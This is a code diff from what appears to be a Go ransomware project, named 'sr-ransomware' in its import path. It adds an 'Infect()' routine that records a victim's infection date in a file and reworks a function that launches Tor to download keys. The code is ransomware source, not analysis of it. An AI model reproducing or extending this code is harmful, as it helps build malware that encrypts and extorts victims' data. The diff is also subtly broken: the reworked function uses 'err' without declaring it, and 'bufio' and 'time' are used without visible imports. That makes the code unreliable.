@@ -4,6 +4,7 @@ import (
     "os"
     "io"
     "io/ioutil"
+    "encoding/gob"
     "encoding/binary"
     "crypto/cipher"
     "crypto/rand"
@@ -19,13 +20,32 @@ import (
     "github.com/sug0/sr-ransomware/go/net/ratelimit"
 )
 
-func DownloadKeysFromTor() error {
+// Checks if the victim should be infected.
+func Infect() (bool, error) {
+    if _, err := os.Stat(victimInfectionDate); err == nil {
+        return false, nil
+    }
     // create work dir
     err := os.Mkdir(workDir, os.ModePerm)
     if err != nil && !os.IsExist(err) {
-        return errors.Wrap(pkg, "failed to create work dir", err)
+        return false, errors.Wrap(pkg, "failed to create work dir", err)
     }
+    // register infection date
+    f, err := os.Create(victimInfectionDate)
+    if err != nil {
+        return false, errors.Wrap(pkg, "failed to create infection date file", err)
+    }
+    defer f.Close()
+    w := bufio.NewWriter(f)
+    err = gob.NewEncoder(w).Encode(time.Now())
+    if err != nil {
+        return false, errors.Wrap(pkg, "failed to encode with gob", err)
+    }
+    err = w.Flush()
+    return err == nil, errors.WrapIfNotNil(pkg, "failed to flush buffer", err)
+}
 
+func DownloadKeysFromTor() error {
     // start tor in the background
     tor := exe.NewTor(torDirectory, "")
     err = tor.Start()
